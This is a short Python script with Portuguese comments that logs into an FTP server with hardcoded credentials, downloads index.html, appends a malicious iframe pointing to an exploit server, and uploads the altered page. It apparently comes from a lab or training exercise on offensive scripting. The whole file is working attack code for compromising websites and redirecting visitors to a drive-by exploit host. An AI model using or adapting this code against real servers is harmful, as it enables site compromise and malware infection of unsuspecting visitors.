#!/usr/bin/python
# -*- coding: utf-8 -*-

import ftplib


def injectPage(ftp, page, redirect):
    """ Funcao para inserir um arquivo html com codigos maliciosos """

    # Abre o arquivo temporario
    f = open('%s.tmp' % (page), 'w')
    # Faz o download do arquivo html do host alvo
    ftp.retrlines('RETR %s' % page, f.write)
    print('[+] Downloaded Page: %s' % (page))

    # Escreve o iframe no arquivo temporario
    f.write(redirect)
    # Fecha o arquivo temporario
    f.close()
    print('[+] Injected Malicious IFrame on: %s' % (page))

    # Faz o upload do arquivo temporario com o redirect, renomeando para o arquivo principal
    ftp.storlines('STOR %s' % (page), open('%s.tmp' % (page), 'rb'))
    print('[+] Uploaded Injected Page: %s' % (page))


# Parametros para conexao no host alvo
host = '192.168.56.107'
userName = 'sandro'
passWord = '123123'

# Cria um objeto de ftp para conexao
ftp = ftplib.FTP(host)
# Loga via ftp usando os parametros informados
ftp.login(userName, passWord)
# Cria um redirect malicioso
redirect = '<iframe src="http:\\\\10.10.10.112:8080\\exploit"></iframe>'
# Chama a funcao para realizar o inject do codigo malicioso
injectPage(ftp, 'index.html', redirect)
